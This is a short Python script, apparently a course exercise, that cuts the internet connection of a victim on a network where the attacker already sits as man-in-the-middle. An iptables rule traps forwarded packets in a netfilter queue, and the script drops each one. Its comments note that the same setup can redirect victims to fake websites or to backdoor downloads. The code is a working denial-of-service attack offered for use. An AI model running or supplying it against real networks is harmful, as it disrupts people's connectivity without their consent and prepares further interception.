#!/usr/bin/env python
# this program used to cut internet connection in any network.
import scapy.all as scapy
import netfilterqueue

#previously we become middle of connection snd sniff data using two py file 
# we can also modify packet and can redirect to different path to fake websit or to download backdoor etc
# scapy can used to have modified packet but cant be used to intercept or drop original one ie both packet will be send to target(router)
#target(access point) will receive both the packet but execute the one which came first as for modified one it takes time so it redirect for original one.
# hence chances are target(router) never execute modified one. 
# to eliminate this problem queue is used in hacker machine and request are traped inside that queue and never send to target unless modified
# queue is then accessed by python program and modified and that is send as request.hence target only receive modified one 
# same way to modify response ie trap it in queue and modify it and send to target(window machine)
# scapy dont allow do above so we use basic setup setting queue and py program to access modify and send
# unix has program called ip table installed in it .used in many thing one is allow us to modify routes in the computer .
# iptables -I FORWARD -j NFQUEUE --queue-num 0 command in cli for trapping packet.(subprocess can also be used as model to execute that command but here not use for simple system command)
# I for chain we want to modify here forward chain which is default chain for packet that come to computer.
# nfqueue is netfilter queue use any queue num here 0.
# now we need to access this queue and modify in py program so net filter queue module used.
# pip install netfilterqueue
def process_packet(packet):
    print(packet)
    packet.drop()#for drop packet and make this program what it is intended for.cut internet connection.
    # packet.accept()#for py program to forward packet to destination.alternet to drop.
queue=netfilterqueue.NetfilterQueue()#cerate object to interact with queue number 0 as specified as command in unix sys
queue.bind(0,process_packet)#used to bind or link this queue variable with system queue which we created with queue num=0.here 0 specifies same.
# 0 is que num in sys ie que we want to interact and process_packet is callback fun which will execute for each packet trapped in that queue.
queue.run()
# should be in mimf to get packet .this program for store in queue and access.drop packet or dont drop(accept)
# after you done with work delete ip table you created in unix command
# iptables --flush is command in cli of unix sys to delete the table

  



